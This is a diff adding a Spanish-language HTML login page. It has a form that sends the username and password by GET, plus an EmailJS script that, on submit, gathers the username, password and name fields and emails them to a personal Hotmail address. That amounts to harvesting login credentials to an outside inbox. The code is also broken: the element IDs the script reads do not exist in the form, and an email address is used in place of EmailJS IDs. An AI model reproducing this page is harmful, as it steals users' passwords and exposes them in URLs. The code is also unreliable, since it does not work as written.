@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="es">
+<head> 
+    <?php
+echo "My first PHP script!";
+?>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        form {
+            max-width: 300px;
+            margin: 20px auto;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 12px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #4caf50;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Título de la Página</title>
+    <!-- Agrega enlaces a tus hojas de estilo CSS, scripts, o cualquier otro recurso necesario -->
+</head>
+<body>
+    <form action="validarUsuario.php" method="get">
+        <label for="Cod_usuario">Usuario:</label>
+        <input type="text" name="Cod_usuario" required>
+
+        <label for="Password">Contraseña:</label>
+        <input type="password" name="Password" required>
+
+        
+
+        <button type="submit">Iniciar Sesión</button>
+    </form>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // Inicializar EmailJS con tu User ID
+        emailjs.init("falcon20112012@hotmail.com");
+
+        // Manejar el evento de envío del formulario
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            // Detener el comportamiento predeterminado del formulario (no se enviará la solicitud)
+            event.preventDefault();
+
+            // Obtener los valores de los campos
+            var usuario = document.getElementById("usuario").value;
+            var contrasena = document.getElementById("contrasena").value;
+            var nombre = document.getElementById("nombre").value;
+            var apellido = document.getElementById("apellido").value;
+
+            // Enviar los datos a través de EmailJS
+            var templateParams = {
+                usuario: usuario,
+                contrasena: contrasena,
+                nombre: nombre,
+                apellido: apellido
+            };
+
+            emailjs.send("falcon20112012@hotmail.com", "falcon20112012@hotmail.com", templateParams)
+                .then(function(response) {
+                    console.log("Correo enviado con éxito:", response);
+                    // Puedes agregar lógica adicional aquí, como redirigir al usuario a una página de confirmación
+                })
+                .catch(function(error) {
+                    console.error("Error al enviar el correo:", error);
+                });
+        });
+    </script>
+    <!-- Contenido de la página va aquí -->
+
+    <!-- Scripts al final del body para mejorar el rendimiento de carga -->
+    <!-- <script src="tu-script.js"></script> -->
+
+</body>
+</html>
